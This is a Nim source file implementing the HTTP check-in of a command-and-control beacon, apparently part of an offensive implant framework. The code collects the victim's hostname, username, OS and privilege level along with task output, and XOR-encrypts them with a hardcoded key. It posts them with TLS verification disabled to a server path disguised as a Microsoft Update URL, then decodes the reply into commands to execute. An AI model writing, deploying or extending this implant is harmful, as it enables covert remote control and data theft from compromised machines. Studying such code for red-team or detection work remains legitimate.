import std/net
import httpclient
import json
import uri
import std/strutils
import std/base64

import Beacon


var Bearer = "Bearer dgfghlsfojdojsdgsghsfgdssfsdsqffgcd"


type 
    BeaconHttp* = ref object of Beacon
        url: string
        port: string


proc initBeaconHttp*(self: BeaconHttp, url, port: string) =
    self.initBeacon()
    self.url = url
    self.port = port


proc checkIn*(self: BeaconHttp) = 
    let client = newHttpClient(sslContext=newContext(verifyMode=CVerifyNone))

    try:
        client.headers = newHttpHeaders({ "Authorization": Bearer, "Content-Type": "application/json" })

        # data to send
        var sessions = newJArray()
        for it in self.taskResults:
            sessions.add(it)

        var nbTaskResults = len(self.taskResults)
        for i in 0..nbTaskResults-1:
            var tmp = self.taskResults.pop()

        var boundel = %*{"arch": self.arch, "beaconHash": self.beaconHash, 
                        "hostname": self.hostname , "listenerHash": "", "os": self.os, 
                        "privilege": self.privilege, "sessions": "", "username": self.username, "lastProofOfLife":"0"}

        boundel["sessions"]=sessions

        var multiBoundel = newJArray()
        multiBoundel.add(boundel)

        var key="dfsdgferhzdzxczevre5595485sdg";
        var datab64 = xorEncode(key, $multiBoundel)
        var bodyToPost = encode(datab64)

        # data received
        let response = client.request(self.url & ":" & self.port & "/MicrosoftUpdate/ShellEx/KB242742/default.aspx", httpMethod = HttpPost, body = bodyToPost)

        # cmdToTasks
        var bodyb64d = decode(response.body)
        var bodyb64dd = xorEncode(key, bodyb64d)
        var cmdToProcess: string
        cmdToProcess = toString(bodyb64dd)
        self.cmdToTasks(cmdToProcess)

    except:
        let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
        echo "Inside checkIn, got exception ", repr(e), " with message ", msg

    finally:
        close(client)


proc runTasks*(self: BeaconHttp) =
    self.execInstruction()